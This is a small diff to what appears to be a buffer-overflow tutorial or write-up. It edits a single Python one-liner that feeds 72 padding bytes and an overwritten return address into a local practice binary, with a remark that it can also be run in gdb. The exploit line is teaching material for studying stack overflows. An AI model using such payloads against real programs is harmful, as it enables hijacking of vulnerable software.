@@ -125,7 +125,7 @@ Written backwards in hex
 ```
 
 4. Stitch it together 
-python2.7 -c "print('A'*72+'\x36\x11\x40\x00\x00\x00\x00\x00')" | ./example.exe
+python2.7 -c "print('A'*72+'\x76\x91\x40\x08')" | ./badcode
 
 Note this can also be run inside gdb.
 
